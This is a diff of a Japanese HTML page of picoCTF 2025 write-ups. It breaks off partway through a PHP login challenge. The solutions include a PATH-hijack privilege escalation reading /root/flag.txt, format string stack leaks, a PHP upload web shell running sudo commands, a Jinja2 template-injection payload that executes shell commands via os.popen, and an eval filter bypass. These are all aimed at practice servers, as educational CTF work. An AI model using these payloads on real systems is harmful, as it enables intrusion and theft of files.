@@ -6,18 +6,22 @@
 	<title>0001.html</title>
 	<link rel="stylesheet" href="/css/default.css">
 	<link rel="stylesheet" href="/css/code.css">
+	<style>
+		details.solved > summary{color: #00c000;}
+		details.unsolved > summary{color: #c00000;}
+	</style>
 </head>
 <body style="padding-left: min(calc(100vw - 800px), 20vw);">
 	<a href="/index.html">戻る</a>
-	<h3>まだ完成されていないページです</h3>
+	<h3>もう少しで完成するページです</h3>
 	<h1>picoCTF 2025 writeup</h1>
 	<p><pre>Global      : RANK 375</pre></p>
 	<p><pre>JP Students	: RANK 18</pre></p>
 	<details class="solved"><summary>&nbsp;75 points | PIE TIME</summary>
 		<div>
-			<p>vuln.cの概要として、</p>
+			<p>vuln.cを読むと、</p>
 			<p><code>printf("Address of main: %p\n", &main);</code></p>
-			<p>でmainのポインタを出力し、</p>
+			<p>でmain関数を指すポインタを出力し、</p>
 			<p><code>scanf("%lx", &val);</code></p>
 			<p>でユーザーの入力(ポインタ)を受け取り、</p>
 			<p><pre><code>void (*foo)(void) = (void (*)())val;<br>foo();</code></pre></p>
@@ -25,7 +29,9 @@
 		</div>
 		<div>
 			<p>win()を実行できればよさそう</p>
-			<p><a href="https://binary.ninja/free/">>> Binary Ninja Free</a> でvulnをデコンパイルしてみると、</p>
+		</div>
+		<div>
+			<p><a href="https://binary.ninja/free/" target="_blank">>> Binary Ninja Free</a>でvulnをデコンパイルしてみると、</p>
 			<table style="margin-left: 40px;">
 				<tr><th class="th_first">Name</th><th class="th_last">address</th></tr>
 				<tr><td style="padding: 0;">:</td><td style="padding: 0;">:</td></tr>
@@ -33,56 +39,61 @@
 				<tr><td>main</td><td>0x00000133d</td></tr>
 				<tr><td style="padding: 0;">:</td><td style="padding: 0;">:</td></tr>
 			</table>
-			<p>となっていることから、</p>
-			<p>出力されたmainのポインタから <a href="https://www.google.com/search?q=0x133d-0x12a7">0x133d - 0x12a7</a> = 0x96 引いた値を入力すればいい</p>
+			<p>となっているから、</p>
+			<p>出力されたmainのポインタから <a href="https://www.google.com/search?q=0x133d-0x12a7" target="_blank">0x133d - 0x12a7</a> = 0x96 引いた値を入力すればいい</p>
 		</div>
 		<div>
-			<p><code class="terminal">nc rescued-float.picoctf.net XXXXX</code></p>
-			<p><pre><code>Address of main: 0x59e47fc5c33d<br>Enter the address to jump to, ex => 0x12345: </code></pre></p>
-			<p><a href="https://www.google.com/search?q=0x33d-0x96">0x33d - 0x96</a> = 0x2a7 より</p>
-			<p><code>0x59e47fc5c2a7</code> でフラグを入手できる</p>
+			<p><code class="bash">nc rescued-float.picoctf.net XXXXX</code></p>
+			<p><pre><code class="output">Address of main: 0x59e47fc5c33d<br>Enter the address to jump to, ex => 0x12345: </code></pre></p>
+		</div>
+		<div>
+			<p><a href="https://www.google.com/search?q=0x33d-0x96" target="_blank">0x33d - 0x96</a> = 0x2a7 なので、</p>
+			<p><code>0x59e47fc5c2a7</code>を入力してエンター</p>
 		</div>
 		<div><p><code>picoCTF{b4s1c_p051t10n_1nd3p3nd3nc3_********}</code></p></div>
 	</details>
 	<details class="solved"><summary>100 points | hash-only-1</summary>
 		<div>
-			<p>バイナリをBinary Ninja Freeで読んでみると、main関数の概要として</p>
-			<p><code>setgid(0);</code></p>
-			<p><code>setuid(0);</code></p>
+			<p>バイナリを<a href="https://binary.ninja/free/" target="_blank">Binary Ninja Free</a>でデコンパイルし読んでみると、</p>
+			<p><pre><code>setgid(0);<br>setuid(0);</code></pre></p>
 			<p>で権限昇格したのち</p>
 			<p><code>system("/bin/bash -c 'md5sum /root/flag.txt'");</code></p>
-			<p>でフラグのmd5ハッシュを出力している。</p>
+			<p>でフラグのmd5ハッシュを出力している</p>
 		</div>
 		<div>
-			<p><small>かなり考えるのに時間を要したが、</small></p>
-			<p>こちらが干渉できるのは、<code>md5sum</code> の部分だと分かる。</p>
+			<p>こちらが干渉できるのは、<code>md5sum</code>の部分</p>
 			<p>この記述において<code>md5sum</code>は、実行ファイルを検索するディレクトリが連ねられた環境変数<code>PATH</code>のもと、</p>
-			<p>md5sumという実行ファイルの場所が検索され、そこに引数<code>/root/flag.txt</code>を渡して実行している。</p>
-			<p>だから、新しくflagの内容を出力するスクリプトをmd5sumという名前で作成し、flaghasherを実行すればよい</p>
+			<p><code>md5sum</code>という実行ファイルの場所が検索され、そこに引数<code>/root/flag.txt</code>を渡して実行している。</p>
+			<p>だから、flagの内容を出力するスクリプトを<code>md5sum</code>という名前で新しく作成して<code>PATH</code>に登録し、flaghasherを実行すればよい</p>
+		</div>
+		<div>
+			<p>スクリプトの具体的な内容は、bashの<code>cat</code>でフラグの中身を出力させればよさそう</p>
+			<p><code>/root</code>は基本的にroot権限でしかアクセスできないので、sudoをつける</p>
+			<p><code>sudo cat /root/flag.txt</code></p>
 		</div>
 		<div>
 			<p>nanoなどを使わなくても、</p>
-			<p><code class="terminal">echo -e '[ファイルの内容]' > [ファイル名]</code></p>
+			<p><code class="bash">echo -e '[ファイルの内容]' > [ファイル名]</code></p>
 			<p>とすれば、スクリプトをファイルに保存できる。</p>
-			<p><code class="terminal">chmod +x [ファイル名]</code></p>
+			<p><code class="bash">chmod +x [ファイル名]</code></p>
 			<p>で、スクリプトを実行可能にできる</p>
 		</div>
 		<div>
 			<p><code>PATH</code>は、<code>:</code>を区切り文字として記述されていて、より左に記述されているディレクトリを優先する</p>
 			<p>PATHの編集は、</p>
-			<p><code class="terminal">export PATH=[編集後のPATH]</code></p>
+			<p><code class="bash">export PATH=[編集後のPATH]</code></p>
 			<p>のようにして行う</p>
 			<p>PATHは<code>$PATH</code>で参照できるので、</p>
-			<p><code class="terminal">export PATH=[追加するパス]:$PATH</code></p>
+			<p><code class="bash">export PATH=[追加するパス]:$PATH</code></p>
 			<p>で優先順位が一番高いところに実行ファイルの検索ディレクトリを追加できる</p>
 		</div>
 		<div>
 			<p>まとめると、</p>
-			<p><code class="terminal">echo -e '#!/bin/bash\ncat /root/flag.txt' > md5sum</code></p>
-			<p><code class="terminal">chmod +x md5sum</code></p>
-			<p><code class="terminal">export PATH=./:$PATH</code></p>
+			<p><code class="bash">echo -e '#!/bin/bash\ncat /root/flag.txt' > md5sum</code></p>
+			<p><code class="bash">chmod +x md5sum</code></p>
+			<p><code class="bash">export PATH=./:$PATH</code></p>
 			<p>とした後に</p>
-			<p><code class="terminal">./flaghasher</code></p>
+			<p><code class="bash">./flaghasher</code></p>
 			<p>でフラグを入手できる</p>
 		</div>
 		<div><p><code>picoCTF{sy5teM_b!n@riEs_4r3_5c@red_0f_yoU_********}</code></p></div>
@@ -94,65 +105,65 @@
 		</div>
 		<div>
 			<p>まず、flaghasherを探してみる</p>
-			<p><code class="terminal">find [場所] -name [ファイル名]</code></p>
+			<p><code class="bash">find [場所] -name [ファイル名]</code></p>
 			<p>でファイルを探せる</p>
-			<p><code class="terminal">find / -name flaghasher</code></p>
-			<p>Permission deniedが多いが、<code>/usr/local/bin/flaghasher</code>だと分かった</p>
-			<p><code class="terminal">echo $PATH</code></p>
-			<p>とすると、PATHに<code>/usr/local/bin</code>が含まれていることが分かる</p>
-			<p>つまり、<code class="terminal">flaghasher</code>で実行できる</p>
+			<p><code class="bash">find / -name flaghasher</code></p>
+			<p>アクセス権限関連で無駄な出力が多いが、<code>/usr/local/bin/flaghasher</code>だと分かった</p>
+			<p><code class="bash">echo $PATH</code></p>
+			<p>とすると、<code>PATH</code>に<code>/usr/local/bin</code>が含まれていることが分かる</p>
+			<p>つまり、<code class="bash">flaghasher</code>で実行できる</p>
 		</div>
 		<div>
 			<p>rbashの制限から脱出する方法は色々あるそうです。今回は</p>
-			<p><code class="terminal">bash</code></p>
+			<p><code class="bash">bash</code></p>
 			<p>で通常のbashを起動しました。</p>
 		</div>
 		<div>
 			<p>ここまで来たらあとはhash-only-1 と同じ。まとめると、</p>
-			<p><code class="terminal">bash</code></p>
-			<p><code class="terminal">echo -e '#!/bin/bash\ncat /root/flag.txt' > md5sum</code></p>
-			<p><code class="terminal">chmod +x md5sum</code></p>
-			<p><code class="terminal">export PATH=./:$PATH</code></p>
+			<p><code class="bash">bash</code></p>
+			<p><code class="bash">echo -e '#!/bin/bash\ncat /root/flag.txt' > md5sum</code></p>
+			<p><code class="bash">chmod +x md5sum</code></p>
+			<p><code class="bash">export PATH=./:$PATH</code></p>
 			<p>とした後に</p>
-			<p><code class="terminal">flaghasher</code></p>
+			<p><code class="bash">flaghasher</code></p>
 			<p>でフラグを入手できる</p>
 		</div>
 		<div><p><code>picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_********}</code></p></div>
 	</details>
 	<details class="solved"><summary>200 points | PIE TIME 2</summary>
 		<div>
-			<p>vuln.c の概要として、PIE TIME と異なる点は、ユーザーの入力(ポインタ)を受け取る前。</p>
+			<p>vuln.c を読む。PIE TIME と異なる点は、ユーザーの入力(ポインタ)を受け取る前、</p>
 			<p><code>fgets(buffer, 64, stdin);</code></p>
 			<p>でバッファにユーザーの入力を受け取り、</p>
 			<p><code>printf(buffer);</code></p>
-			<p>でprintfの第一引数としている</p>
-			<p>この部分で、win()関数のポインタを取得する必要がある</p>
+			<p>でprintfの第一引数としている。</p>
+			<p>この時点で、win()関数のポインタを特定する必要がある</p>
 		</div>
 		<div>
-			<p><code>printf([ユーザーの入力]);</code>は、良く知られた脆弱性で、書式文字列攻撃という。</p>
-			<p>printfの第1引数に<code>%p</code>が使われると、そこに代入されるのはスタックに保存された値(を16進表記にしたもの)なので、</p>
+			<p><code>printf([ユーザーの入力]);</code>は良く知られた脆弱性で、そこを突いた攻撃は書式文字列攻撃という。</p>
+			<p>printfの第1引数に<code>%p</code>が使われると、そこに代入されるのはスタックに保存された値(16進表記)なので、</p>
 			<p><code>%p%p%p%p....</code>を入力すれば、スタックの中身が</p>
 			<p><code>0x2e70257025702570(nil)0x555f507c62ad0x7ffcf1214760....</code>と出力される</p>
 		</div>
 		<div>
 			<p>また、PIE TIME から分かるように、ポインタの16進数の下3桁はデコンパイルした時の値と同じになるようなので、</p>
-			<p>スタックの中身を出力し、それらしいポインタの値を見つけて、それをもとにwin()関数のポインタを判断することができる</p>
+			<p>スタックの中身を出力してそれらしいポインタの値を見ることで、win()関数のポインタを特定できる</p>
 		</div>
 		<div>
-			<p>Binary Ninja Free でデコンパイルすると、</p>
+			<p><a href="https://binary.ninja/free/" target="_blank">Binary Ninja Free</a>でデコンパイルすると、</p>
 			<table style="margin-left: 40px;">
 				<tr><th class="th_first">Name</th><th class="th_last">address</th></tr>
 				<tr><td style="padding: 0;">:</td><td style="padding: 0;">:</td></tr>
-				<tr><td>_start</td><td>0x0000011c0</td></tr>
+				<tr><td>_start</td><td>0x000001<b>1c0</b></td></tr>
 				<tr><td style="padding: 0;">:</td><td style="padding: 0;">:</td></tr>
-				<tr><td>win</td><td>0x00000136a</td></tr>
+				<tr><td>win</td><td>0x000001<b>36a</b></td></tr>
 				<tr><td style="padding: 0;">:</td><td style="padding: 0;">:</td></tr>
 			</table>
 		</div>
 		<div>
 			<p><code>%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p_%p</code>を入力すると、</p>
 			<p><code>0x5ea28f7132a1_...(略)..._0x5ea254c2a<b>1c0</b>_...(略)..._0x7a3392b9d083</code>と返された</p>
-			<p>1c0 が _start と対応していると推測すると、win()のアドレスは 0x5ea254c2a<b>36a</b> と予想できる。</p>
+			<p>1c0 が _start と対応していると推測すると、win()のポインタは 0x5ea254c2a<b>36a</b> と予想できる。</p>
 			<p>これを入力するとフラグを入手できた</p>
 		</div>
 		<div><p><code>picoCTF{p13_5h0u1dn'7_134k_********}</code></p></div>
@@ -167,8 +178,8 @@
 	<details class="solved"><summary>100 points | hashcrack</summary>
 		<div>
 			<p>16進数で乱雑な値は大体hashです。</p>
-			<p><a href="https://crackstation.net/">>> CrackStation</a></p>
-			<p>等を使って、出題されたhashのもととなったデータをクラッキングして答えていくと、flagをもらえる</p>
+			<p><a href="https://crackstation.net/" target="_blank">>> CrackStation</a></p>
+			<p>等を使って、出題されたhashの元データをクラッキングして答えていくと、flagをもらえる</p>
 		</div>
 		<div><p><code>picoCTF{UseStr0nG_h@shEs_&PaSswDs!_********}</code></p></div>
 	</details>
@@ -176,17 +187,16 @@
 		<div>
 			<p><small>自分は詳しくは理解できていませんが、</small></p>
 			<p>https通信に使われているRSA暗号は、適切に鍵を生成しないと脆弱になります。</p>
-			<p><a href="https://www.dcode.fr/rsa-cipher">>> RSA Cipher Calculator</a></p>
-			<p>等のツールを使って、与えられたN, e, c(cyphertext(暗号化された文))を入力して読みだすと、フラグを得られます</p>
+			<p><a href="https://www.dcode.fr/rsa-cipher" target="_blank">>> RSA Cipher Calculator</a></p>
+			<p>等のツールを使って、与えられたN, e, c(cyphertext(暗号化された文))を入力してDecryptすると、フラグを得られます</p>
 			<p>今回は、鍵の生成に用いる2つ素数のうち1つが 2 と非常に小さい数であったため、簡単に特定できてしまったみたいです。</p>
 		</div>
 		<div><p><code>picoCTF{tw0_1$_pr!m********}</code></p></div>
 	</details>
 	<details class="solved"><summary>200 points | Guess My Cheese (Part 1)</summary>
-		<div><p><b>25% Liked</b>だそうです。これを踏まえて解きます</p></div>
 		<div>
-			<p><code class="terminal">nc verbal-sleep.picoctf.net 58487</code></p>
-			<p><pre><code>Here's my secret cheese -- if you're Squeexy, you'll be able to guess it:  VZOONNKWKV
+			<p><code class="bash">nc verbal-sleep.picoctf.net 58487</code></p>
+			<p><pre><code class="output">Here's my secret cheese -- if you're Squeexy, you'll be able to guess it:  VZOONNKWKV
 Hint: The cheeses are top secret and limited edition, so they might look different from cheeses you're used to!
 Commands: (g)uess my cheese or (e)ncrypt a cheese
 What would you like to do?</code></pre></p>
@@ -196,30 +206,29 @@ What would you like to do?</code></pre></p>
 			<p>とりあえず(e)ncrypt a cheeseしてみる</p>
 		</div>
 		<div>
-			<p><pre><code>What would you like to do?<br>e<br>What cheese would you like to encrypt? </code></pre></p>
-			<p><code>What cheese would you like to encrypt? cheese</code></p>
-			<p><code>I'm sorry I haven't had that cheese before, so I can't encrypt it!</code></p>
+			<p><pre><code class="output">What would you like to do?<br>e<br>What cheese would you like to encrypt? </code><code>cheese</code></pre></p>
+			<p><code class="output">I'm sorry I haven't had that cheese before, so I can't encrypt it!</code></p>
 		</div>
 		<div>
 			<p>cheeseはチーズの名前ではないみたい それはそうか...</p>
 			<p><b style="font-size: 1.2em;">ここでGuess My Cheese (Part 2)の問題文を見ます</b></p>
-			<p>list of cheeses がありました。</p>
+			<p><code>list of cheeses</code>がありました。</p>
 			<p>このリストの中で、暗号化した後にツールが暗号化の種類を認識してくれそうな物を選びます。</p>
 			<p>Bergader とか良さそう</p>
 		</div>
 		<div>
-			<p><code>What cheese would you like to encrypt? Bergader</code></p>
-			<p><code>Here's your encrypted cheese:  ONAVXWNA</code></p>
+			<p><code class="output">What cheese would you like to encrypt? </code><code>Bergader</code></p>
+			<p><code class="output">Here's your encrypted cheese:  ONAVXWNA</code></p>
 		</div>
 		<div>
-			<p><a href="https://www.dcode.fr/cipher-identifier">>> Cipher Identifier</a></p>
+			<p><a href="https://www.dcode.fr/cipher-identifier" target="_blank">>> Cipher Identifier</a></p>
 			<p>で Affine Cipher らしいということが分かったので</p>
-			<p><a href="https://www.dcode.fr/affine-cipher">>> Affine Cipher</a></p>
+			<p><a href="https://www.dcode.fr/affine-cipher" target="_blank">>> Affine Cipher</a></p>
 			<p>に突っ込むと、Resultの上から7番目に来ました。それらしい結果を上に表示してくれるみたいです。</p>
-			<p><code>A=17,B=23&Tab;BERGADER</code></p>
+			<p><code class="output">A=17,B=23&Tab;BERGADER</code></p>
 			<p>これをもとにVZOONNKWKVを復号化すると、</p>
 			<p><code>GUBBEENDNG</code></p>
-			<p><b>そのまま</b>入力するとフラグを貰える</p>
+			<p><b>そのまま</b>入力するとフラグを入手できた</p>
 		</div>
 		<div><p><code>picoCTF{ChEeSy********}</code></p></div>
 		<div><p><small>なお、実際はもっと混沌とした方法で進めていましたが、最終的な方法を修正するとこのような感じになったということです</small></p></div>
@@ -239,7 +248,7 @@ What would you like to do?</code></pre></p>
 			</table>
 			<p>と変換されていることが分かった</p>
 			<p>これをもとに</p>
-			<p><a href="https://www.openwall.com/john/">>> John the Ripper</a></p>
+			<p><a href="https://www.openwall.com/john/" target="_blank">>> John the Ripper</a></p>
 			<p>でSHA256を試したが、だめだった</p>
 		</div>
 	</details>
@@ -364,26 +373,26 @@ Hash type: Recovery Password with MAC verification (slower solution, no false po
 			<p>が非常に参考になりました</p>
 		</div>
 		<div>
-			<p><code class="terminal">sudo apt install dislocker</code></p>
-			<p><code class="terminal">sudo apt-get install libfuse-dev</code></p>
-			<p><code class="terminal">sudo mkdir /media/bitlocker /media/mount</code></p>
-			<p><code class="terminal">sudo dislocker -r -V bitlocker-1.dd -u -- /media/bitlocker</code></p>
+			<p><code class="bash">sudo apt install dislocker</code></p>
+			<p><code class="bash">sudo apt-get install libfuse-dev</code></p>
+			<p><code class="bash">sudo mkdir /media/bitlocker /media/mount</code></p>
+			<p><code class="bash">sudo dislocker -r -V bitlocker-1.dd -u -- /media/bitlocker</code></p>
 			<p><code>Enter the user password: </code></p>
-			<p><code class="terminal">sudo -i</code></p>
-			<p><code class="hash">cd /media/bitlocker</code></p>
-			<p><code class="hash">mount -r -o loop dislocker-file /media/mount</code></p>
-			<p><code class="hash">cd /media/mount</code></p>
-			<p><code class="hash">ls</code></p>
+			<p><code class="bash">sudo -i</code></p>
+			<p><code class="root">cd /media/bitlocker</code></p>
+			<p><code class="root">mount -r -o loop dislocker-file /media/mount</code></p>
+			<p><code class="root">cd /media/mount</code></p>
+			<p><code class="root">ls</code></p>
 			<p><code>'$RECYCLE.BIN'  'System Volume Information'   flag.txt</code></p>
-			<p><code class="hash">cat flag.txt</code></p>
+			<p><code class="root">cat flag.txt</code></p>
 			<p>フラグを入手できた</p>
 		</div>
 		<div><p><code>picoCTF{us3_b3tt3r_p4ssw0rd5_pl5!_********}</code></p></div>
 		<div>
-			<p><code class="hash">exit</code></p>
-			<p><code class="terminal">sudo umount /media/mount</code></p>
-			<p><code class="terminal">sudo umount /media/bitlocker</code></p>
-			<p><code class="terminal">sudo rm -rf /media/bitlocker /media/mount</code></p>
+			<p><code class="root">exit</code></p>
+			<p><code class="bash">sudo umount /media/mount</code></p>
+			<p><code class="bash">sudo umount /media/bitlocker</code></p>
+			<p><code class="bash">sudo rm -rf /media/bitlocker /media/mount</code></p>
 		</div>
 	</details>
 	<details class="solved"><summary>200 points | Event-Viewing</summary>
@@ -418,7 +427,7 @@ Hash type: Recovery Password with MAC verification (slower solution, no false po
 	<details class="solved"><summary>&nbsp;10 points | FANTASY CTF</summary>
 		<div>
 			<p>言われた通りnetcatで接続</p>
-			<p><code class="terminal">nc verbal-sleep.picoctf.net 52486</code></p>
+			<p><code class="bash">nc verbal-sleep.picoctf.net 52486</code></p>
 			<p>Enterで物語を読み進めながらpicoCTFのRulesに則った正しい選択をする</p>
 		</div>
 		<div><p><code>picoCTF{m1113n1um_3d1710n_********}</code></p></div>
@@ -446,7 +455,7 @@ Hash type: Recovery Password with MAC verification (slower solution, no false po
 		</div>
 		<div>
 			<p>これらの修正を行った後、</p>
-			<p><code class="terminal">cargo run</code></p>
+			<p><code class="bash">cargo run</code></p>
 		</div>
 		<div><p><code>picoCTF{4r3_y0u_4_ru$t4c********}</code></p></div>
 	</details>
@@ -458,7 +467,7 @@ Hash type: Recovery Password with MAC verification (slower solution, no false po
 			<p>mut をつけて可変な参照にする</p>
 		</div>
 		<div>
-			<p><code class="terminal">cargo run</code></p>
+			<p><code class="bash">cargo run</code></p>
 		</div>
 		<div><p><code>picoCTF{4r3_y0u_h4v1n5_********}</code></p></div>
 		<details style="padding-left: 15px;"><summary><small>関数の後に<code>party_foul</code>を使うことはないため、参照でなく所有権を渡しても良い。その場合</small></summary>
@@ -473,7 +482,7 @@ Hash type: Recovery Password with MAC verification (slower solution, no false po
 			<p>まとめてunsafeを明示する</p>
 		</div>
 		<div>
-			<p><code class="terminal">cargo run</code></p>
+			<p><code class="bash">cargo run</code></p>
 		</div>
 		<div><p><code>picoCTF{n0w_y0uv3_f1x3d_********}</code></p></div>
 	</details>
@@ -485,7 +494,7 @@ Hash type: Recovery Password with MAC verification (slower solution, no false po
 		</div>
 		<div>
 			<p><pre><code>rule dummy{<br>&Tab;condition:<br>&Tab;&Tab;false<br>}</code></pre>
-			<pre><code class="terminal">socat -t60 - TCP:standard-pizzas.picoctf.net:XXXXX &lt; sample.txt</code></pre>
+			<pre><code class="bash">socat -t60 - TCP:standard-pizzas.picoctf.net:XXXXX &lt; sample.txt</code></pre>
 			<pre><code>Status: Failed
 False Negatives Check: Testcase failed. Your rule generated a false negative.
 False Positives Check: Testcases passed!
@@ -531,50 +540,218 @@ Pass all the testcases to get the flag.</code></pre>
 		<div><p><code>picoCTF{70637h3r_f0r3v3r_********}</code></p></div>
 	</details>
 	<details class="unsolved"><summary>200 points | Binary Instrumentation 1</summary>
-		<div></div>
+		<div>わからない</div>
 	</details>
 	<details class="unsolved"><summary>200 points | Tap into Hash</summary>
-		<div></div>
+		<div>わからない</div>
 	</details>
 	<details class="solved"><summary>200 points | Chronohack</summary>
-		<div></div>
+		<div>
+			<p>コードの内容を見ると、<code>get_random(20)</code>でトークンを生成している</p>
+			<p><code>random.seed(int(time.time() * 1000))</code>から、UNIXtimeのミリ秒で乱数を初期化していることが分かる</p>
+		</div>
+		<div>
+			<p>現在時刻を元にトークンを生成してから送っても、フラグを得ることはできなかった。</p>
+			<p>これは通信のラグだと思ったので、現在時刻のミリ秒を1ずつ足していって50回認証してみる</p>
+			<p>が、それでも得ることができなかったので、最初に50足した後に1ずつ足していって100まで認証すると、フラグを得ることができた</p>
+		</div>
+		<div><p><code>picoCTF{70637h3r_f0r3v3r_********}</code></p></div>
 	</details>
 	<details class="solved"><summary>200 points | Quantum Scrambler</summary>
-		<div></div>
+		<div>
+			<p>そのままplaintextを推測するのは無理があるので、ABCなどの単純な文字列を入れてみる</p>
+		</div>
+		<div>
+			<p><code>ABC</code></p>
+			<p>-><code>[['0x41', '0x42'], ['0x43', []]]</code></p>
+		</div>
+		<div>
+			<p><code>ABCDE</code></p>
+			<p>-><code>[['0x41', '0x42'], ['0x43', [], '0x44'], ['0x45', [['0x41', '0x42']]]]</code></p>
+		</div>
+		<div>
+			<p><code>ABCDEFGH</code></p>
+			<p>-><code>[['0x41', '0x42'], ['0x43', [], '0x44'], ['0x45', [['0x41', '0x42']], '0x46'], ['0x47', [['0x41', '0x42'], ['0x43', [], '0x44']]], ['0x48']]</code></p>
+		</div>
+		<div>
+			<p>配列の深さが2のところを読みだせばいいことが分かる</p>
+		</div>
+		<div>
+			<pre><code>for i in eval(input()):
+	first = chr(int(i[0], 16))
+	last = i[-1]
+	if isinstance(last, list):
+		last = ""
+	elif len(i) == 1:
+		last = ""
+	else:
+		last = chr(int(last, 16))
+	print(first, end="")
+	print(last, end="")</code></pre>
+		</div>
+		<div><p><code>picoCTF{python_is_weird********}</code></p></div>
 	</details>
 	<details class="unsolved"><summary>300 points | Binary Instrumentation 2</summary>
-		<div></div>
+		<div>わからない</div>
 	</details>
 	<details class="solved"><summary>400 points | perplexed</summary>
-		<div></div>
+		<div>
+			<p>Binary Ninja Free で読んでみると、</p>
+			<p><code>0xe1a71ef875237b61b99dfc5a5bdf69d2fe1bedf4ed67f4</code></p>
+			<p>を7ビットごとに取り出して、入力文字列の下位7ビットと等しければ認証されることがわかる</p>
+		</div>
+		<div>
+			<pre><code>#include <iostream>
+#include <array>
+
+const std::array<uint8_t, 23> data = 
+{
+	0xe1, 0xa7, 0x1e, 0xf8, 0x75, 0x23, 0x7b, 0x61, 0xb9, 0x9d, 0xfc, 0x5a, 0x5b, 0xdf, 0x69, 0xd2,
+	0xfe, 0x1b, 0xed, 0xf4, 0xed, 0x67, 0xf4
+};
+
+char out[30];
+
+int main(){
+	int cnt = 0;
+	for(uint8_t i : data){
+		for(int j = 0; j < 8; ++j){
+			out[cnt / 7] |= ((i >> (7 - j)) & 1) << (6 - (cnt % 7));
+			cnt ++;
+		}
+	}
+	puts(out);
+}</code></pre>
+		</div>
+		<div><p><code>picoCTF{0n3_bi7_4********}</code></p></div>
 	</details>
 	<h2>Web Exploitation</h2>
 	<details class="solved"><summary>&nbsp;50 points | Cookie Monster Secret Recipe</summary>
-		<div></div>
+		<div>
+			<p>テキトーにパスワードとユーザー名を入力して送信すると、クッキーモンスターに</p>
+			<p><q>Me no need password. Me just need cookies!</q></p>
+			<p>と言われる。クッキーを確認すると</p>
+			<p>secret_recipe: <code>cGljb0NURntjMDBrMWVfbTBuc3Rlcl9sMHZlc19jMDBraWVzX0FDOEZDRDc1fQ%3D%3D</code></p>
+			<p>とあったので、</p>
+			<p><code>%3D</code>を<code>=</code>になおしてBase64でデコードすると</p>
+		</div>
+		<div><p><code>picoCTF{c00k1e_m0nster_l0ves_c00kies_********}</code></p></div>
 	</details>
 	<details class="solved"><summary>&nbsp;50 points | head-dump</summary>
-		<div></div>
+		<div>
+			<p>ページ内を見てみると、#API Documentation にAPIのドキュメントへのリンクがあった</p>
+			<p>問題文みたいな名前の heapdump を Try it out -> Excute してみると、レスポンスをダウンロードできる</p>
+			<p>ダウンロードしたheapdump内で<code>pico</code>を検索すると、フラグを見つけることができた</p>
+		</div>
+		<div><p><code>picoCTF{Pat!3nt_15_Th3_K3y_********}</code></p></div>
 	</details>
 	<details class="solved"><summary>100 points | n0s4n1ty 1</summary>
-		<div></div>
+		<div>
+			<p>試しにファイルをアップロードしみると、<code>uploads.php</code>に送られ、</p>
+			<p><code>The file [ファイル名] has been uploaded Path: uploads/[ファイル名]</code>との表示が出た</p>
+			<p>また、<code>uploads/[ファイル名]</code>に移動すると、内容が表示された(画像ファイルなら画像が表示され、テキストファイルならテキストが表示された)</p>
+			<p>phpで処理されていることから、phpファイルを送信すればその内容が実行されると考える</p>
+		</div>
+		<div>
+			<p><code>send.php</code>の内容を</p>
+			<p><code><?php system("sudo ls /root") ?></code></p>
+			<p>として送信すると、<code>/uploads/send.php</code>では</p>
+			<p><code>flag.txt</code>と表示された</p>
+		</div>
+		<div>
+			<p><code>send.php</code>の内容を</p>
+			<p><code><?php system("sudo cat /root/flag.txt") ?></code></p>
+			<p>として送信すると、<code>/uploads/send.php</code>でフラグが表示された</p>
+		</div>
+		<div><p><code>picoCTF{wh47_c4n_u_d0_wPHP_********}</code></p></div>
 	</details>
 	<details class="solved"><summary>100 points | SSTI1</summary>
-		<div></div>
+		<div>
+			<p>いろいろ送ってみると<code>{{</code>で500エラーが送られてきた</p>
+			<p>いろいろ調べてみると、このサーバーはJinja2を使っていることが分かる</p>
+		</div>
+		<div>
+			<p><code>{{request.application.__globals__.__builtins__.__import__('os').popen('<code>[任意のコード]</code>').read()}}</code></p>
+			<p>で任意のコードが実行可能みたいなので、</p>
+			<p><code>{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}</code>とすると</p>
+			<p><code>flag</code>というファイルがあることがわかる</p>
+		</div>
+		<div>
+			<p><code>{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}</code></p>
+			<p>でフラグを入手できた</p>
+		</div>
+		<div><p><code>picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_********}</code></p></div>
 	</details>
 	<details class="solved"><summary>200 points | WebSockFish</summary>
-		<div></div>
+		<div>
+			<p>チェスの対戦が始まる</p>
+			<p>普通にチェスをやっても、買ったりしても、フラグをもらることはない</p>
+		</div>
+		<div>
+			<p><a href="https://portswigger.net/burp/communitydownload">Burp Suite Community Edition</a>等で通信を見ると、</p>
+			<p>コマを動かすたびに<code>WebSocket</code>で<code>eval [数値]</code>といったデータを送信し、数値に応じたメッセージが返されている</p>
+		</div>
+		<div>
+			<p>数値を<code>-50000</code>よりも小さい数に設定して送信すると、フラグを入手できた</p>
+		</div>
+		<div><p><code>picoCTF{c1i3nt_s1d3_w3b_s0ck3t5_********}</code></p></div>
 	</details>
 	<details class="solved"><summary>200 points | 3v@l</summary>
-		<div></div>
+		<div>
+			<p>送った内容を<code>eval()</code>してくれるそう</p>
+			<p>様々な関数名がフィルタリングされているが、<code>open</code>は通るみたい</p>
+			<p>ヒントからフラグの位置は<code>/flag.txt</code>とわかるので</p>
+			<p><code>open("/flag.txt").read()</code>をしたい</p>
+		</div>
+		<div>
+			<p><code>open(chr(47) + "flag" + chr(46) + "txt").read()</code>とすると、フラグを入手できた</p>
+		</div>
+		<div><p><code>picoCTF{D0nt_Use_Unsecure_f@nctions********}</code></p></div>
 	</details>
 	<details class="unsolved"><summary>200 points | SSTI2</summary>
-		<div></div>
+		<div>わからない</div>
 	</details>
 	<details class="solved"><summary>300 points | Apriti sesamo</summary>
-		<div></div>
+		<div>
+			<p>ヒントから、このサイトの作成者はEmacsユーザーだとわかる</p>
+			<p>Emacsではファイル編集前に<code>[ファイル名]~</code>というバックアップファイルが作成される</p>
+			<p><code>/impossibleLogin.php~</code>を見ることができた。外見は同じだが、先ほどとは違いソースコードにphpのコードがある</p>
+		</div>
+		<div>
+			<p>phpコードを読みやすくすると、</p>
+			<p><pre><code>if(isset($_POST["username"]) && isset($_POST["pwd"])){
+	$yuf85e0677=$_POST["username"];
+	$rs35c246d5=$_POST["pwd"];
+	if($yuf85e0677==$rs35c246d5){
+		echo "<br/>Failed! No flag for you";
+	}
+	else{
+		if(sha1($yuf85e0677)===sha1($rs35c246d5)){
+			echo file_get_contents("../flag.txt");
+		}
+		else{
+			echo "<br/>Failed! No flag for you";
+		}
+	}
+}</code></pre></p>
